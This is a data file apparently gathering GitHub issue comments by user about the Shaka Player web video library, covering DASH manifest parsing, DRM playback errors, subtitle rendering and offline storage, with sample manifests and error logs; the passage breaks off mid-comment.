    "mad-gooze": "Yes, I mean segments that are available on the server for a current moment.. @joeyparrish Shimming the manifest parser should by done by using opt_manifestParserFactory in load() and passing an object that proxies default shaka.dash.DashParser? It's unclear for me from docs which fields I should observe to watch for available segments. Could you add a more detailed example of how do I do that please?. Thanks, I have successfully extracted SegmentReference using getCurrentSegmentReference()!\nActually I understood that I need a more narrow case - I want to get info about currently playing segment (like url and duration, for statistics) and subscribe for a segment change. Is there a simpler API for that?. This method greatly simplifies code in my case, thx!. Thanks! For now I will stick to hiding this control when there are no text tracks via shadow dom pseudo class where possible.\ncss\nvideo::-webkit-media-controls-toggle-closed-captions-button {\n    display: none;\n}. We are using this patch https://gist.github.com/toshic/ff57c9004fdc18010894bfb86daf86de\nto fix this issue in our build now. \nMaybe there is a better solution for that?. If segments url is relative it should be resolved from <BaseURL>\nThe problem is that after manifest is updated with a new <BaseURL>, segments url are still resolved from old <BaseURL>.. this is described in https://dashif.org/docs/DASH-IF-IOP-v4.3.pdf\n3.2.15. MPD Location and Reference Resolution. > Which should result in a segment request to https://test.org/base/init.mp4. Is this your situation? \nCorrect! Now shaka ignores <BaseURL> update and still fetches segment from https://livesim.dashif.org/base/init.mp4. ",
    "ivivona": "@vaage i control both the generation and the player, so any solution is ok, but I think it will be better to let the player know from where to reproduce using the info in the MPD (in this case the url anchor). The use case is: a \"watch from the start\" button in page A goes to the player in page B with certain manifest URL, the player's page is kind of generic because the the manifest could be a VOD or a live.. @vaage thanks for the response. I understand that there is a javascript solution, but my question was if shaka implements/supports MPD Anchors as indicated in the DASH specification.. Yes, thanks. Anyway, should this be implement in the future?. ",
    "bengeorge": "\nDoes the problem still happen if you don't import the core-js promise polyfill?\n\nYes this still holds true \ud83d\udc4d \"Note. If I remove the polyfil then shaka works.\"\nIs it possible that shaka is actually polyfilling more than just promise in promise.js ?  I'm not overly familiar with the promise spec but I'll take a look at https://github.com/google/shaka-player/blob/adb8da4764e3080693252ba0211cd4f936fa27be/lib/polyfill/promise.js. In case anyone else finds same issue:  our temp fix is to just use the shaka polyfil instead of core-js \ud83d\ude05 \n```\n// There are issues with core-js promise polyfil and shaka in IE11.\n// For now we will rely on shaka promise polyfil.\n// See: https://github.com/google/shaka-player/issues/1062\n// import 'core-js/modules/es6.promise';\nimport { polyfill } from 'shaka-player';\npolyfill.installAll();\n``.import 'core-js/fn/promise';` works perfectly \ud83d\udc4d \n@joeyparrish @theodab You guys are awesome.  Thanks a bunch for looking into that!\nAnd sorry for wasting your time \ud83d\ude05 I should have never doubted shaka!. ",
    "noedod": "Thanks for your prompt answer.\nI can't have the log for now, just more precisions about one of the devices : \n~~~\nKernel Version\n3.18.35+\nandroid@mec17#1\nFri Jun2 11:14:08 CST 2017\nBuild number :\nNRD90M.WW_P00C-V5.3.10-20170602\n070010929_201612210851\n~~~\nPlease let us know when the problem will be resolved. \nMany users of our websites have the same problem on these devices.\nRegards, \nNo\u00e9. Hi Joey,\nI finally found a Zenpad to test the Shaka Player Demo on it and reproduce the error 3016.\nMEDIA.VIDEO_ERROR (4,, DECODER ERROR NOT SUPPORTED\u2026\n\n\n\nSince our first comment here, we received a lot of messages from users on those ASUS ZenPad and ZenPhone devices. They can't watch the movie they bought and it's a huge problem for us. \nPlease let us know when the problem will be resolved.\nRegards,\nNo\u00e9. ",
    "samaduttan": "The shaka-player(\"version\": \"2.3.0\") playback getting halted after played for some time.Am getting the failure as PIPELINE_ERROR_DECODE.Attached the error screen shot.\nput up below mpd file\n<MPD xmlns=\"urn:mpeg:dash:schema:mpd:2011\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"urn:mpeg:dash:schema:mpd:2011 DASH-MPD.xsd\" xmlns:cenc=\"urn:mpeg:cenc:2013\" profiles=\"urn:mpeg:dash:profile:isoff-live:2011\" minBufferTime=\"PT5S\" type=\"dynamic\" publishTime=\"2018-04-04T19:28:22Z\" availabilityStartTime=\"2018-04-04T18:22:33Z\" minimumUpdatePeriod=\"PT5S\" timeShiftBufferDepth=\"PT26S\" suggestedPresentationDelay=\"PT15S\">\n  <Period id=\"0\" start=\"PT0S\">\n    <AdaptationSet id=\"0\" contentType=\"audio\" segmentAlignment=\"true\">\n      <Representation id=\"0\" bandwidth=\"191162\" codecs=\"mp4a.40.2\" mimeType=\"audio/mp4\" audioSamplingRate=\"48000\">\n        <AudioChannelConfiguration schemeIdUri=\"urn:mpeg:dash:23003:3:audio_channel_configuration:2011\" value=\"2\"/>\n        <SegmentTemplate timescale=\"90000\" initialization=\"audio_first.mp4\" media=\"audio_first_$Number$.m4s\" startNumber=\"720\">\n          <SegmentTimeline>\n            <S t=\"352360650\" d=\"451200\" r=\"1\"/>\n            <S t=\"353263050\" d=\"449280\"/>\n            <S t=\"353712330\" d=\"451200\"/>\n            <S t=\"354163530\" d=\"449280\"/>\n            <S t=\"354612810\" d=\"451200\" r=\"1\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n    </AdaptationSet>\n    <AdaptationSet id=\"1\" contentType=\"video\" width=\"1280\" height=\"720\" frameRate=\"90000/1501\" segmentAlignment=\"true\" par=\"16:9\">\n      <Representation id=\"1\" bandwidth=\"3005054\" codecs=\"avc3.64002a\" mimeType=\"video/mp4\" sar=\"1:1\">\n        <SegmentTemplate timescale=\"90000\" initialization=\"video_first.mp4\" media=\"video_first_$Number$.m4s\" startNumber=\"720\">\n          <SegmentTimeline>\n            <S t=\"352362991\" d=\"450450\" r=\"6\"/>\n          </SegmentTimeline>\n        </SegmentTemplate>\n      </Representation>\n    </AdaptationSet>\n  </Period>\n</MPD>\n. . Joey Parrish\nmy streaming server is not there in public domain, if you can do a remote\nsession, i can set up my environment.\n. @shaka-bot reopen, I am still facing this issue.. when i do the playback at the same time in chrome, firefox and Edge, in chrome alone the playback  getting interrupted. \nIt is working fine in chrome, if i disable the hardware decoder, but by default the chrome settings is hardware decoder enabled.. Shaka player version is 2.5.0-beta, The same player in firefox, the duration is displayed as different.\n\n duration. . Thanks joey, for the quick catch up and response of the issue.I would like to know when the UI library release would be, is it some time around near by.. ",
    "matenadasdi": "Hm yeah thanks, do you may have an example implementation for that somewhere? Using Shaka with EMSG boxes in chunks?. I meant a JS snippet which implements EMSG support in Shaka or merging the two options what you've mentioned, a Shaka player which plays the example sample content with EMSG boxes maybe.. ",
    "gleb-shchavlev": "CORS errors was on 404 answers, fixed.\nSometimes need to move slider to the right of player window to make stream live.\nWhere is no CORS problem if translation goes in live.. I restart stream. It's available right now.. Just checked on Firefox 57.0b12 (64-bit).\nIt does not work.\nThe behavior is same.. Oh, ok. Tried. Chunks downloaded, white screen in player window.\nError apears:\nShaka Error MEDIA.VIDEO_ERROR (3,,NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) - class mozilla::ipc::IPCResult __cdecl mozilla::gmp::ChromiumCDMParent::RecvDecodeFailed(const unsigned int &): ChromiumCDMParent::RecvDecodeFailed). Nope, issue was fixed. It was bug in drm packager code.. ",
    "KieronAllsop": "Adding my experience with what appears to be the same bug. However the one caveat is the following behaviour only occurs when automating playback - I get NO errors when manually playing the same content on the same browsers. I should add that the these are real machines (not VMs) and it is only since the latest round of browser updates that this occurs.\nAutomation setup\n- Robot framework\n- Selenium Standalone Server 3.7.1 (grid and node)\n- Selenium 3.7.0\n- Geckodriver 0.19.0\n- Chromedrvier 2.33\n- Firefox version 56 and 57\n- Chrome version 62 and 63\n- Windows 10 \nError occurs when trying to playback content for which the 'HDCP Required' rule must be enforced.\nFirefox output (console)\nMedia resource blob:https://urm.latens.com/429e435a-9c5a-4347-9846-462a6472345e could not be decoded.\ndemo\nPlayer error \nObject { category: 3, code: 3016, data: [?], message: \"Shaka Error MEDIA.VIDEO_ERROR (3,)\", stack: \"shaka.util.Error@https://urm.latens.com/boomplayer/lib/util/error.js:77:13\\nshaka.Player.prototype.onVideoError_@https://urm.latens.com/boomplayer/lib/player.js:1760:17\\n\" }\nmain.js:258:3\nMedia resource blob:https://urm.latens.com/429e435a-9c5a-4347-9846-462a6472345e could not be decoded.\ndemo\nMedia resource blob:https://urm.latens.com/429e435a-9c5a-4347-9846-462a6472345e could not be decoded, error: Error Code: NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005)\nDetails: class mozilla::ipc::IPCResult __cdecl mozilla::gmp::ChromiumCDMParent::RecvDecodeFailed(const unsigned int &): ChromiumCDMParent::RecvDecodeFailed\nChrome output (media://internals)\nTimestamp | Property | Value\n------- | ---------- | -----------\n00:00:00 00 | origin_url | https://urm.latens.com/\n00:00:00 00 | frame_url | https://urm.latens.com/boomplayer/demo/\n00:00:00 00 | frame_title | Shaka Laka Player\n00:00:00 00 | url | blob:https://urm.latens.com/a410ce94-1715-4449-bc37-d620f73ab15e\n00:00:00 03 | pipeline_state | kStarting\n00:00:10 643 | has_cdm | true\n00:00:10 669 | found_audio_stream | true\n00:00:10 669 | audio_codec_name | aac\n00:00:10 727 | found_video_stream | true\n00:00:10 727 | video_codec_name | h264\n00:00:10 735 | debug | DecryptingAudioDecoder: failed to init decoder on decryptor\n00:00:10 736 | audio_dds | true\n00:00:10 736 | audio_decoder | FFmpegAudioDecoder\n00:00:10 744 | video_dds | false\n00:00:10 744 | video_decoder | DecryptingVideoDecoder\n00:00:10 744 | pipeline_state | kPlaying\n00:00:10 747 | info | DecryptingDemuxerStream: no key for key ID A63F23DCD98445E9AC1201E4A50E5D32\n00:00:10 755 | info | DecryptingVideoDecoder: no key for key ID A63F23DCD98445E9AC1201E4A50E5D32\n00:00:10 648 | duration | 157.04\n00:00:12 210 | info | DecryptingDemuxerStream: key was added, resuming decrypt\n00:00:12 210 | info | DecryptingVideoDecoder: key added, resuming decode\n00:00:12 212 | info | DecryptingDemuxerStream: no key for key ID A63F23DCD98445E9AC1201E4A50E5D32\n00:00:12 223 | info | DecryptingVideoDecoder: no key for key ID A63F23DCD98445E9AC1201E4A50E5D32\n00:00:15 17 | pipeline_state | kSuspending\n00:00:15 18 | pipeline_state | kSuspended\n00:00:35 15o | info | Selected video track: []\nWill gladly supply any further information if needed.\nEDIT: I should add that a workaround for the error during automated testing is to have the video paused in a different instance of either Chrome or Firefox; the automated test then passes as the video plays rather than giving the error.. Yes it occurs in both Firefox and Chrome, but not in Edge with the same steps so must at some level be related to Widevine ?\nIn response to your thought @chrisfillmore that it could be related to license server configuration, neither the first play request, which causes the hang, nor the second play request ever reach the license server.. Version of Chrome is 62.0.3202.75\nWidevine Content Decryption Module - Version: 1.4.8.1029\nWindows 10.15063\nNavigate to https://urm.latens.com/boomplayer/demo/ (v2.2.5-debug)\nSelect 'Custom Asset'\n- Asset = https://storage.googleapis.com/shaka-demo-assets/angel-one-widevine/dash.mpd\n- License = https://www.random_address.com/license\nSelect 'Load'\nImmediate error:\n\"Shaka Error DRM.LICENSE_REQUEST_FAILED (shaka.util.Error { \"severity\": 2, \"category\": 1, \"code\": 1002, \"data\": [ \"https://www.random_address.com/license\" ], \"handled\": false, \"message\": \"Shaka Error NETWORK.HTTP_ERROR (https://www.random_address.com/license)\", \"stack\": \"Error: Shaka Error NETWORK.HTTP_ERROR (https://www.random_address.com/license)\\n at new shaka.util.Error (https://shaka-player-demo.appspot.com/lib/util/error.js:72:13)\\n at XMLHttpRequest.xhr.onerror (https://shaka-player-demo.appspot.com/lib/net/http_plugin.js:92:14)\" })\"\nClear lead plays, then video stops.\nIf I go to drop down and select a different asset (clear or widevine) nothing happens when I select 'Load'\nI must reload page to get anything to play again.\nDoes the same in iOS Sierra 10.12.6 (Chrome and Widevine versions the same). @joeyparrish can I ask what operating system you are running Chrome on? \nI agree the issue is not reproducible in linux (Fedora 25 specifically). \nHowever having tried both links given above and the same version of Chrome/Widevine I can reproduce the issue on our Windows 10 (v15063), Windows 10 Insiders (v17025), High Sierra and Sierra test machines.. ",
    "odedhutzler": "thanks!. hey @joeyparrish, I want to use getManifest, but the variants inside the periods are lack of segments list. How can I can retrieve the segment list per a period? Do i have to create a new manifest parser plugin?. thanks @TheModMaker ! I will get the URI with list[i].createUris();. @joeyparrish I wanted to download the content, using background fetch, so i needed the segment list. \nThe solution @TheModMaker gave worked great for me.\nCurrently we will try and work with shaka offline storage, because bg fetch is not ready yet.. Hey @joeyparrish,\nUpon closing this issue, are you considering the pause / resume & renew license features? \nWe also thought of constantly updating the manifest in the DB, so if the browser / tab is closed accidentally, the user will be able to continue the download from where it ended. Are you considering some kind of anti-failure mechanism?. Hey, thanks. I am familiar with the offline tutorial\n@vaage why is saving content with a service worker is not recommended? using Shaka for offline storage was my first thought but it still lacks some features I want (like text tracks). @joeyparrish, thanks.\nWe intend saving one track subset per an entry (one audio, one video and one text track) - will it still cause issues with the bandwidth and adaption estimations?\nAlso, we would like more control on the download process, and the downloaded data (pausing, resuming, managing a queue of downloads etc). In the future we want to use the background fetch API (in the service worker) which will allow us to download content while the browser is closed.\nDoes that sound reasonable? Do you have any way of managing the offline license?. thanks Joey,\nWill there be/ is there a reconstruct manifest api? something like reconstructManifest(flavor,language,originalManifest)\nregarding the offline license api - do you have any plans to expose it?. @ismena thanks.\ncurrently @joeyparrish answered my questions (sorry for not responding).. Hey @joeyparrish, any updates here? Are you planning to add the new features?. I signed it!. @ismena , @TheModMaker & @joeyparrish - thanks for reviewing.\n@ismena I modified according to your comments.\n@TheModMaker I removed the segments urls from the segments object if already downloaded - definitely redundant data :). \nRegarding the big changes to the DB & storage internals (and background fetch) - do you have anything in mind already? some kind of design? i would be happy to follow it and change my PR accordingly.. @joeyparrish no worries, its understandable. I would be happy to be part of the design & implementation.\nThanks.. @joeyparrish, thanks.\nso i cannot delete it while i'm offline. Is it on the roadmap? maybe as part of the big change you are planing for the storage?. defiantly.. :)\ncool! thanks.. @TheModMaker alright, thanks.. so in the meanwhile, i am trying to create a renewal mechanism by myself.\nI created a function that gets the manifest from the DB, then i created a drmEngine and:\nsession.load(manifestDb.sessionID) //old session ID\n.then(()=>return session.remove()) //removing the old session\n.then(()=>return loadInternal(...)) // which should create a new license session.\n...\n.then(()=> this.storageEngine_.updateManifest // with the new sessionID & expiration.\nthat seems to work.\nhowever, when i am trying to load the offline asset, i get \n\nShaka Error DRM.FAILED_TO_CREATE_SESSION (Rejected with system code (70))\n\nafter i refresh the page the offline asset plays without any issue.\nany thoughts? \nWhat is system code 70? \n. @joeyparrish cool! i will try that and let you know.. @joeyparrish seems to do the trick, thanks!!. @joeyparrish sure thing!. hey @joeyparrish, any thoughts on this one? :). @joeyparrish @TheModMaker thanks for the review.\n@vaage would be happy to be part of it when you get to it.\nThanks!. Hey, @joeyparrish thanks. Yes, it does.\nOded. Hey, @joeyparrish thanks. Yes, it does.\nOded. thanks , i will follow #880 . @joeyparrish yes, thanks for the detailed explanation.\n. Yes :) . @ismena, changed. But why do you prefer == over ===?. ",
    "palemieux": "@joeyparrish Thanks for the feedback. Is the following possible for a plug-in to:\n\nreceive the media sample, i.e. TTML document, and a target rendering DOM element (e.g. div overlaying the video object)?\nreturn the times at which it would like to be called back, and opaque state information to be passed at each call back?\n\nAt each callback, the TTML plugin would draw the subtitle/captions in the target rendering DOM element.. Ok. Thanks for the details. As I understand it,\n\nthe media track is parsed and Text Cue instances are generated\nthese Text Cue instances are passed to a Text Displayer plugin for rendering\n\nIs that right? If so, what happens if the current Text Cue interface does not support the full range of capabilities offered by TTML? Can the media track parser return any object as long as it implements the Text Cue interface? Will the full object be passed back to the plugin?\nI am thinking the media track parser could return a TTML cue that implements the current interface (for minimal compatibility) but also contains the information (as private members) needed to fully render the TTML cue. Would that work?\nThanks for your help. Happy to continue the discussion offline. Feel free to DM me at pal@sandflow.com.. TTML supports capabilities beyond what shaka.text.Cue supports, including:\n\nstyle variations within a cue (color, text decoration, font weight, etc.)\nposition of the cue within the video\netc...\n\nCouple of options:\n\nextend shaka.text.Cue to support all these variations\nallow shaka.text.Cue to carry an HTML fragment that would be generated by the TTML parser\nallow shaka.text.Cue to carry a TTML-specific object that would be generated by the TTML parser, and be available to the TTML rendering plugin\n\nimscJS can readily support the second and third options.\nThoughts?. > That is way too big for a built-in subtitle parser. If you want to use imscJS to handle TTML, you can always have a text-parsing plugin\n\nat the application level which replaces our default TTML parser.\n\nSeems a reasonable approach: have the application provide text parser and cue renderer implementations, e.g. using imscJS. Perhaps a simple example is all that is required.\n. @joeyparrish P.S.: I very much appreciate your taking the time to explore these various options.. As discussed in #1080, perhaps it is simplest to simply create a text parser and cue renderer plugin outside of this project, using imscJS potentially.. ",
    "nigelmegitt": "Makes sense to allow the Cue object to support richer definition of payload content than it does now. Maybe even by allowing Cue.payload to be a Cue itself, or if you don't want to support infinite nesting, then by including some kind of markup within the payload that would override the appropriate properties like fontStyle, fontWeight, color etc. for a subsection of text within them.\nSome approach like that will be required to support TTML properly since it allows style attributes to be specified on spans within what are considered \"cues\" here.. > TTML regions are specified in px\n@joeyparrish In general (dependent on profile), TTML regions can be specified in other units too - percentages are very common, being percentage of the \"root container region\" which is usually aligned to something related to the video, like the decoded video image area or the viewport.\nIt is also common to require that the root container region's extent in pixels is specified on the tt element if pixel units are used which means that any pixel values can be converted simply to percentages. IMSC requires this. EBU-TT-D prohibits use of px units altogether.. ",
    "TomHetmer": "Email response (Thanks!)\n\nThe issue seems to be that the suggestedPresentationDelay attribute is too small. In this example, it's set to 1s.\nThe timeShiftBufferDepth attribute defines how much data is available from the server. In this case, it's 45s.\nThe \"live edge\" of the stream is defined by the difference between now and the availabilityStartTime attribute. (This is why clock sync matters.)\nThere is also an explicit description of segments in SegmentTimeline in this manifest. So we only know about the ones we have seen in this timeline.\nFinally, the minimumUpdatePeriod attribute is set to 5s.\nLet's dig into how this works. The player fetches a manifest, which in this case contains descriptions of around 10 segments, at about 1s each. So we know about 10s worth of content, and that's the most we can fetch. Based on minimumUpdatePeriod, we update a new manifest 5s later, which contains about 5 new segments we didn't know about. When you compare this to the calculated live edge, you'll see that we can't stay within 5s of that live edge. The buffering indicator will jump forward to the right edge, then fall back toward around -5s, then jump forward again, over and over.\nThe purpose of suggestedPresentationDelay is to introduce a difference between the \"ideal\" live edge and what we present to the user as the live edge. It covers up this window in which the buffering indicator jumps back and forth. With a delay of 5-10s, you should see this effect disappear. The player will be able to buffer ahead up to the \"ideal\" live edge, so with a suggestedPresentationDelay of 10s, the player can get up to 10s ahead of what it shows to the user.\nComing back to timeShiftBufferDepth, you will find that suggestedPresentationDelay eats into this, because both represent content that is available on the server. So if you want a 10s delay and you want the user to be able to rewind or pause up to 45s, you should set timeShiftBufferDepth to 55s.\n. Seems to be fixed in flussonic_4.7.0-20-g8699909 :-). We workarounded around this by changing all[header[0].toLowerCase() to all[header[0].toLowerCase().trim(). Sure. This link is valid for 30 days.\nhttps://mgmt.cdn77-ivysilani.cz/play?token=&contentType=live&expiry=1515281018&id=2402&playerType=dash&quality=web&region=1&skipIpAddressCheck=true&userId=user_id. \n",
    "media-square": "Is there an update concerning this bug, since we are facing the same issue?. So basically, there is a solution which should work for live streams but... \nWhen can we expect a patch or will this issue not being fixed?. ",
    "bafolts": "Will the work involved here be a function to getStartTimeFromAacSegment_ implemented to parse the aac segment and pull it's start time?. Depending on which version of chrome you updated to there was a recent update to the auto play policy in april.\nhttps://developers.google.com/web/updates/2017/09/autoplay-policy-changes. ",
    "bes": "We are interested in this patch as well. ",
    "peet-j": "+1. ",
    "hung-yueh": "Hi @joeyparrish ,\nThanks for responding the issue so quickly, I have sent the testing stream via email. Please let me know if there is anything I can help.. @joeyparrish Yes, you are totally correct!. ",
    "sagb": "We have the same problem. Flussonic (major video streaming software) generates playlists with audio tracks URI, except of the default:\n```\nEXT-X-MEDIA:TYPE=AUDIO,GROUP-ID=\"aac\",NAME=\"a1\",DEFAULT=YES,AUTOSELECT=YES\nEXT-X-MEDIA:TYPE=AUDIO,GROUP-ID=\"aac\",NAME=\"a2\",DEFAULT=NO,AUTOSELECT=YES,URI=....\nEXT-X-MEDIA:TYPE=AUDIO,GROUP-ID=\"aac\",NAME=\"a3\",DEFAULT=NO,AUTOSELECT=YES,URI=....\n```\nIt would be nice if shaka could handle this.\n. ",
    "aptly-io": "@joeyparrish Sorry to come back at this closed issue. I've prototyped a working solution that extracts all sidx information from the media files listed in the MPD. The solution also determines the initial segment's start and end. Supporting the latter is a ugly. I'm seeking advice for a more elegant solution that I might have overlooked ...\nThe segment handling code returns a shaka.dash.DashParser.StreamInfo from its createStream(). This object contains the initSegmentReference object of type shaka.media.InitSegmentReference with an const startByte and const endByte. At the time that StreamInfo is created and returned, these start and end are unknown: set to 0. (the createSegmentIndex promise is not yet resolved).\nAfter parsing all sidx boxes, also the actual start & end of the init segment is known; only now the start and end inside the InitSegmentReference is updated. I had to drop the const because of this to make the closure compiler happy. Therefore I wonder; would there be a more elegant solution to update these values inside the initSegmentReference? \nNote: it's impossible for me (even with your assistance :-) to have the content creation department to update their many legacy and future MPD; it's like another company that I've no access to (like climbing over 100 Mount Everest's) . I (and customers) have just have to live with the sub-optimal crippled MPD situation.\nThanks.. @joeyparrish Thank you for the feedback!\nYes, I saw your approach for parsing partial mp4 boxes with the stop_ flag to prevent running into BUFFER_READ_OUT_OF_BOUNDS; will adopt this (I was returning false from a new boxHeader(call-back) to halt further parsing/reading).\nThe content is MP4 (with h264, AAC and TTML-TXT or PNG inside).\nI see clear benefits from creating a pull request. I need to check with superiors (dev. time constraints and getting over the CLA are huge).. \nfm_demo.txt\nfm_app.txt\n. @joeyparrish Thank you for your fix!. ",
    "zshenker": "@OrenMe Could you say what tools you are using to package/encrypt the media when you are having these issues?\nI am encountering the same issues with media from Shaka Packager, but have been able to get successful playback in Edge 16 with DASH CENC(Widevine + PlayReady) content from Bento4.\n@joeyparrish Would you have any more insights into what the actual issue is here, and if there might be any changes in the media packaging/encryption that could work around this issue?. Thanks @joeyparrish. One of the big differences I can see in the media from Shaka Packager vs from packagers where playback is working, is that from Shaka Packager, the first 2 segments are not encrypted(clear), where as in the other cases I have been testing all segments are encrypted.. @joeyparrish @kqyang I just re-packaged my content with --clear_lead 0 and confirm I am now getting successful playback in Edge 16.. @joeyparrish @kqyang Did you ever here anything further from the Edge team on this?. ",
    "leejonghyeon0106": "I am having same issue on Edge, IE after Fall Creator Update. It is hard to re-package contents since I have many contents. Is there any solution without re-packaging contents?\nIf there is any update please share information. Thanks.. ",
    "Murmur": "I have Edge/16.16299(Win10) browser and had problems with playready protected dash content. This issue gave me a solution, it is a packager not encrypting the first segment. Quick fix was to change startNumber=\"2\" and content worked but 10s was skipped in the start. Unfortunately I have no control of the packager so must contact the provider.. You are using ShakaPackager? Do you provide --clear_lead 0 parameter so that all the segments from 0..n are encrypted, default I guess is first 10s is not encrypted.. You are using ShakaPackager? Do you provide --clear_lead 0 parameter so that all the segments from 0..n are encrypted, default I guess is first 10s is not encrypted.. Is that doc available for everyone? I could use it as well.. Is that doc available for everyone? I could use it as well.. ",
    "tjber": "I'll test it and come back with the results.\nThank you very much!. Hi!\nI've tried again, both with the Demo app and the master.\nThe timescale attribute is already taken into account in the SegmentBase, but frame accuracy is not yet possible, it only jumps from second to second.\nI mean, with these values: \n    <SegmentBase indexRangeExact=\"true\" indexRange=\"915-1138\" timescale = \"100\"  presentationTimeOffset=\"212\" >\nPlayback starts at second 3, not 2,120.\nAlso, If the manifest has more than 1 period, the presentationTimeOffset is only taken into account in the first period, playback of the following periods starts in the second 0.\nThis is the mpd file i used for testing.\ndash.mpd.txt\nThanks! \n. \nHi,\n@TheModMaker , I've tried your guess and it's good. I have generated a file in which all the frames are keyframes and so it is positioned correctly. \nUnfortunately, in my case it's not a valid solution because I won't be able to regenerate the files, so I'll need to find a workaround.\nThe playback of the second period still does not take into account the presentationTimeOffset, even with these new files. \nI've added the regenerated materials and the two manifests I've tested with to the dropbox folder: \nhttps://www.dropbox.com/sh/zfbynu6n9bxhd9q/AAB4TEvA9g71UADgne0pqwKia?dl=0\ndash. mpd --> manifest that I've been doing the tests\ndash_allkeyframes. mpd --> manifest that refers to regenerated files in which all frames are keyframes \n(you can download and use them freely, they are a replica of my original files that I created to document the issue) \n. Hi @joeyparrish  thank you! I\u00b4ll try with playRangeStart/playRangeEnd and splitting each period in one manifest, not ideal but quite better than transcode :) \n. Hi @joeyparrish \nI'm sorry for the delay in answering. I've been out for a few days. \nThank you very much! that was exactly the behavior I expected.\nI'll try to get the \"allkeyframe\" files sent to me to avoid the initial jump. \nThank you so much.. ",
    "thedracle": "So- I am seeing this issue where the timestamps output by muxjs are different than my TS segments when the presentationTimeOffset isn't 0. \nBasically my first MPEGTS segment starts at 133500:\n{\n            \"media_type\": \"video\",\n            \"stream_index\": 0,\n            \"key_frame\": 1,\n            \"pkt_pts\": 133500,\n            \"pkt_pts_time\": \"1.483333\",\n            \"pkt_dts\": 133500,\n            \"pkt_dts_time\": \"1.483333\",\n            \"best_effort_timestamp\": 133500,\n            \"best_effort_timestamp_time\": \"1.483333\",\n            \"pkt_duration\": 3750,\n            \"pkt_duration_time\": \"0.041667\",\n            \"pkt_pos\": \"564\",\n            \"pkt_size\": \"10638\",\n            \"width\": 320,\n            \"height\": 240,\n            \"pix_fmt\": \"yuv420p\",\n            \"sample_aspect_ratio\": \"1:1\",\n            \"pict_type\": \"I\",\n            \"coded_picture_number\": 0,\n            \"display_picture_number\": 0,\n            \"interlaced_frame\": 0,\n            \"top_field_first\": 0,\n            \"repeat_pict\": 0\n        }\nIn the logs I see:\nFirst segment 750k.ts starts at 1.4833333333333334\nWhich matches the first PTS (Although there is an earlier PTS for the first audio packet in the stream which appears later).\nThe presentationTimeOffset is set to 1.4833333333333334, but the code to adjust the PTS via the transmuxer sets it to adjust by 0:\nlib/media/transmuxer.js:\nthis.muxTransmuxer_.setBaseMediaDecodeTime(startTime * timescale);\n^ Tracing in the debugger 'startTime' is 0.\nAs a result the transmuxed mp4 seems to adjust all of the timestamps:\n{\n            \"media_type\": \"video\",\n            \"stream_index\": 0,\n            \"key_frame\": 1,\n            \"pkt_pts\": 7500,\n            \"pkt_pts_time\": \"0.083333\",\n            \"pkt_dts\": 7500,\n            \"pkt_dts_time\": \"0.083333\",\n            \"best_effort_timestamp\": 7500,\n            \"best_effort_timestamp_time\": \"0.083333\",\n            \"pkt_pos\": \"2877\",\n            \"pkt_size\": \"28480\",\n            \"width\": 640,\n            \"height\": 480,\n            \"pix_fmt\": \"yuv420p\",\n            \"sample_aspect_ratio\": \"1:1\",\n            \"pict_type\": \"I\",\n            \"coded_picture_number\": 0,\n            \"display_picture_number\": 0,\n            \"interlaced_frame\": 0,\n            \"top_field_first\": 0,\n            \"repeat_pict\": 0\n        },\nAnd MediaSourceExtensions croaks with the following error:\nvideo frame with PTS 141667us has negative DTS -66667us after applying timestampOffset, handling any discontinuity, and filtering against append window\nAlso, I wonder if getStartTimeFromTsSegment_ in lib/hls/hls_parser.js needs to be adjusted to search for a minimum timestamp closer to the beginning of the TS stream, rather than just reading the PTS out of the first TS packet it finds that has one.. @TheModMaker \nI think it is maybe a combination of the multiple streams and the fact the timestamp from the first PES packet is used, and the issue I detailed above.\nThis is just an experiment and not really a suggestion, that parses through more than one PES packet to try to find the earlier PTS:\nhttps://github.com/thedracle/shaka-player/pull/2/files\nIt succeeds on the clip I provided above (Probably a more robust strategy would be required in reality), but it still fails with the same MediaSourceExtension errors due to the setBaseMediaDecodeTime not being set correctly.. @joeyparrish, \nYes, I'll generate a new clip, it's something to do with how FFMPEG is generating those segments from the clip I provided, and test again.. Here is a HLS clip with similar encoding, that doesn't have the zero duration issue:\nhttps://shakarepro.s3-us-west-1.amazonaws.com/cut5/mbr/manifest.m3u8. ",
    "TomMettam": "I forgot to mention: One way in which this example is different from the previous examples, is that this isn't 100% reproducible - it doesn't happen on every play. It only occurs when VP9 hardware acceleration is in use.. ",
    "meladc": "@sandersaares \u2013 the context is standard key rotation and not an hierarchical one. \nDASH-IF IOP v4.0 refers to it as periodic re-authorization (section 7.5) and describes multiple implementation options, one of which (7.5.3.2) is to use a DASH period as the minimum period for key duration. This is not to say that key rotation must use a new period, as another described option talks about providing future keys in PSSH without relation to periods (7.5.3.3). Key hierarchy is mentioned as a third implementation option, but there might be more options, for example \u2013 if the license server has the logic to know what keys to return regardless of the PSSH info, etc.\n@joeyparrish \u2013 I\u2019m not sure that I understand the question. \nIf I understand Shaka\u2019s current implementation, then it looks for a PSSH in the MPD, and \n if found - does not listen to the PSSH events coming from media segments. \n If there is no PSSH in the MPD, then Shaka listens to PSSH events from the media segments while filtering duplicated PSSHs based on binary/string comparison. \nWhat I would suggest is to always listen to PSSH events from the media segments, but to keep filtering them if the PSSH is identical to the one from the MPD. DASH CENC spec notes that cenc:pssh element in the MPD needs to have identical structure to the one in the media segments, so such filtering can take place. \nAs VOD is less subject to key rotation, and as all content (including required keys) can be assumed known in advance, Shaka may choose to apply an optimization for VOD, taking into account only the PSSH information from the MPD. This optimization may raise issues if assumptions don\u2019t hold.\n. So if I understand correctly, what you say is - \n1. PSSH events in the stream are only meant for hierarchical key scenarios. \n2. They must be related to already pre-fetched root licenses, and \n3. They should not trigger a license request in no circumstances (as the PSSH from the MPD will trigger it).\nMaybe this is not the right forum to ask, but I  am wondering if this is the common understanding of how DASH/CENC should work.\n. I must admit this thread makes me go back to thoroughly read the IOP and the spec. Interesting though.\n@TheModMaker  Your suggestion seems perfect. I'll give it a go and report back.\n@kqyang Thanks for describing the two options. I guess that in the first option PSSH boxes are signaled in the media segments and trigger license request upon key rotation, right? I assume in the second option PSSH can be signaled either in the MPD, init segment or media segments.. @TheModMaker  - checked this configuration (manifest.dash.ignoreDrmInfo) and it works. \nI'm just wondering if it is really necessary to choose either signaling from the 